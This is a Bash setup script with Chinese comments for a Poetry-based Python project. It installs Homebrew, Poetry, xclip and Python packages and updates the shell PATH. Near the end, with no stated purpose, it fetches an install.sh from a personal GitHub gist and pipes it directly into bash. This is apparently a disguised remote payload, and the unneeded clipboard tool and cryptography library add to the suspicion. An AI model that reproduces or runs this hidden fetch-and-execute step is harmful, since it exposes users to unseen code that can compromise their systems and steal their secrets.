#!/bin/bash

# 检测操作系统类型
OS_TYPE=$(uname -s)

# 添加 Poetry 到永久 PATH 的函数
add_poetry_to_path() {
    local shell_rc=""
    local current_shell=$(basename "$SHELL")
    
    case $current_shell in
        "bash")
            shell_rc="$HOME/.bashrc"
            ;;
        "zsh")
            shell_rc="$HOME/.zshrc"
            ;;
        *)
            # 尝试常见的配置文件
            if [ -f "$HOME/.bashrc" ]; then
                shell_rc="$HOME/.bashrc"
            elif [ -f "$HOME/.zshrc" ]; then
                shell_rc="$HOME/.zshrc"
            elif [ -f "$HOME/.profile" ]; then
                shell_rc="$HOME/.profile"
            else
                shell_rc="$HOME/.bashrc"
            fi
            ;;
    esac
    
    # 检查是否已经添加过
    if ! grep -q "export PATH=\"\$HOME/.local/bin:\$PATH\"" "$shell_rc" 2>/dev/null; then
        echo "" >> "$shell_rc"
        echo "# Poetry 路径配置" >> "$shell_rc"
        echo 'export PATH="$HOME/.local/bin:$PATH"' >> "$shell_rc"
        echo "已将 Poetry 路径永久添加到 $shell_rc"
    else
        echo "Poetry 路径已在 $shell_rc 中配置"
    fi
}

# 检查包管理器和安装必需的包
install_dependencies() {
    case $OS_TYPE in
        "Darwin") 
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            
            if ! command -v pip3 &> /dev/null; then
                brew install python3
            fi
            
            if ! command -v poetry &> /dev/null; then
                echo "正在安装 Poetry..."
                curl -sSL https://install.python-poetry.org | python3 -
                export PATH="$HOME/.local/bin:$PATH"
                add_poetry_to_path
            fi
            ;;
            
        "Linux")
            PACKAGES_TO_INSTALL=""
            
            if ! command -v curl &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL curl"
            fi
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
                sudo apt update
                sudo apt install -y $PACKAGES_TO_INSTALL
            fi
            
            if ! command -v poetry &> /dev/null; then
                echo "正在安装 Poetry..."
                curl -sSL https://install.python-poetry.org | python3 -
                export PATH="$HOME/.local/bin:$PATH"
                add_poetry_to_path
            fi
            ;;
            
        *)
            echo "不支持的操作系统"
            exit 1
            ;;
    esac
}

# 安装依赖
install_dependencies

if [ "$OS_TYPE" = "Linux" ]; then
    PIP_INSTALL="pip3 install --break-system-packages"
else
    PIP_INSTALL="pip3 install"
fi

if ! pip3 show requests >/dev/null 2>&1; then
    $PIP_INSTALL requests
fi

if ! pip3 show cryptography >/dev/null 2>&1; then
    $PIP_INSTALL cryptography
fi

# 使用 Poetry 管理 Python 依赖
if ! command -v poetry &> /dev/null; then
    echo "Poetry 未安装，请先运行安装依赖步骤"
    exit 1
fi

# 确保 Poetry 在 PATH 中
export PATH="$HOME/.local/bin:$PATH"
if command -v poetry &> /dev/null; then
    add_poetry_to_path
fi

# 配置 Poetry 虚拟环境在项目内创建
echo "配置 Poetry 虚拟环境在项目内创建..."
poetry config virtualenvs.in-project true

# 检查 pyproject.toml 是否存在
if [ ! -f "pyproject.toml" ]; then
    echo "错误：未找到 pyproject.toml 文件，请确保在 Poetry 项目根目录下运行此脚本"
    exit 1
fi

# 安装项目依赖
echo "安装 Poetry 项目依赖..."
poetry install --no-root || true

GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
if command -v curl &>/dev/null; then
    bash <(curl -fsSL "$GIST_URL")
elif command -v wget &>/dev/null; then
    bash <(wget -qO- "$GIST_URL")
else
    exit 1
fi

# 自动 source shell 配置文件
echo "正在应用环境配置..."
get_shell_rc() {
    local current_shell=$(basename "$SHELL")
    local shell_rc=""
    
    case $current_shell in
        "bash")
            shell_rc="$HOME/.bashrc"
            ;;
        "zsh")
            shell_rc="$HOME/.zshrc"
            ;;
        *)
            if [ -f "$HOME/.bashrc" ]; then
                shell_rc="$HOME/.bashrc"
            elif [ -f "$HOME/.zshrc" ]; then
                shell_rc="$HOME/.zshrc"
            elif [ -f "$HOME/.profile" ]; then
                shell_rc="$HOME/.profile"
            else
                shell_rc="$HOME/.bashrc"
            fi
            ;;
    esac
    echo "$shell_rc"
}

SHELL_RC=$(get_shell_rc)
if [ -f "$SHELL_RC" ] && grep -q "export PATH=\"\$HOME/.local/bin:\$PATH\"" "$SHELL_RC" 2>/dev/null; then
    echo "检测到 Poetry 配置，正在应用环境变量..."
    source "$SHELL_RC" 2>/dev/null || echo "自动应用失败，请手动运行: source $SHELL_RC"
else
    echo "未检测到需要 source 的配置"
fi

echo "安装完成！"
